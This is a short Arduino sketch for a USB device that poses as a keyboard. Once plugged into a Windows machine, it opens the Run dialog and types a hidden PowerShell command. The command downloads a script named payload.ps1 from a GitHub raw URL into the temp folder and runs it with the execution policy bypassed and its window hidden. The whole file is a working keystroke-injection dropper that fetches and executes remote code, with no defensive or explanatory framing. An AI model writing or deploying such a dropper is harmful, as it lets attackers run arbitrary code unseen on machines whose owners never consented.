#include <Keyboard.h>

void setup() {
  // Start the Keyboard library
  Keyboard.begin();

  delay(5000); // Give time for the system to be ready (e.g., after plugging in)

  // Open Run dialog using Windows key + R
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500); // Wait for Run dialog to open
  Keyboard.releaseAll();

  // Type the PowerShell hidden execution command
  Keyboard.print("powershell -WindowStyle Hidden -Command \"");
  Keyboard.print("& {iwr -uri 'https://raw.githubusercontent.com/xXThanatosXx997/RubberD/main/payload.ps1' -OutFile $env:temp\\payload.ps1; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:temp\\payload.ps1' -WindowStyle Hidden}\"");
  
  // Press Enter to execute the command
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  // End keyboard emulation
  Keyboard.end();
}

void loop() {
  // Nothing to do here, the action is complete
}